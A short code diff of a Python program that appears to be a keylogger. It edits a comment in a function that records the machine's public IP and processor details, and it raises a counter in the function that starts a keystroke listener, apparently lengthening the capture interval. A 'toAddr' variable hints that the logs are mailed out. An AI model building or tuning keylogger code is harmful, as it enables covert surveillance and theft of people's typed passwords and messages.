@@ -85,7 +85,7 @@ def computer_information():
                 public_ip = response.read().decode()
             f.write(f"Public IP Address: {public_ip}\n")
         except urllib.error.URLError:
-            # called if say there's no internet connection
+            # called if say there's something causing the connection request to fail
             f.write("Public IP Address: Couldn't get Public IP Address\n")
 
         f.write("Processor: " + (platform.processor()) + '\n')
@@ -143,7 +143,7 @@ listener = Listener(on_press=on_press)
 # Function to start keylogger
 def start_logger():
     global listener, toAddr, btnStr
-    count = 10
+    count = 900
     listener.start()
     btnStr.set("Stop Keylogger")
     while True:
